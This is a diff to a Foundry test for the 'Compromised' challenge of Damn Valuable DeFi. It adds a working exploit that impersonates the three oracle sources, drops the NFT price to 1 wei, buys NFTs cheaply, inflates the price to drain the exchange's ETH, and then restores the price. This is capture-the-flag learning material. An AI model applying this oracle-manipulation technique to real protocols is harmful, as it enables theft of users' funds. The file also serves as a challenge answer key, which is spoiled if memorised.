@@ -17,9 +17,10 @@ contract Compromised is Test {
     TrustfulOracleInitializer internal trustfulOracleInitializer;
     DamnValuableNFT internal damnValuableNFT;
     address payable internal attacker;
+    address[] sources;
 
     function setUp() public {
-        address[] memory sources = new address[](3);
+        sources = new address[](3);
 
         sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
         sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
@@ -73,13 +74,51 @@ contract Compromised is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT",1 wei);
 
-        /**
-         * EXPLOIT END *
-         */
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT",1 wei);
+
+        vm.prank(sources[2]);
+        trustfulOracle.postPrice("DVNFT",1 wei);
+
+
+        vm.startPrank(attacker);
+        exchange.buyOne{value: 1 wei}();
+        exchange.buyOne{value: 1 wei}();
+        exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        uint256 newPrice = 9990000000000000000003/3;
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT",newPrice);
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT",newPrice);
+
+        vm.prank(sources[2]);
+        trustfulOracle.postPrice("DVNFT",newPrice*2);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange),0);
+        damnValuableNFT.approve(address(exchange),1);
+        damnValuableNFT.approve(address(exchange),2);
+        exchange.sellOne(0);
+        exchange.sellOne(1);
+        exchange.sellOne(2);
+        vm.stopPrank();
+
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT",INITIAL_NFT_PRICE);
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT",INITIAL_NFT_PRICE);
+
+        vm.prank(sources[2]);
+        trustfulOracle.postPrice("DVNFT",INITIAL_NFT_PRICE);
+
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -87,14 +126,15 @@ contract Compromised is Test {
     function validation() internal {
         // Exchange must have lost all ETH
         assertEq(address(exchange).balance, 0);
+        console.log("ex balance",address(exchange).balance);
 
         // Attacker's ETH balance must have significantly increased
         assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
 
-        // Attacker must not own any NFT
+        // // Attacker must not own any NFT
         assertEq(damnValuableNFT.balanceOf(attacker), 0);
 
-        // NFT price shouldn't have changed
+        // // NFT price shouldn't have changed
         assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
 }
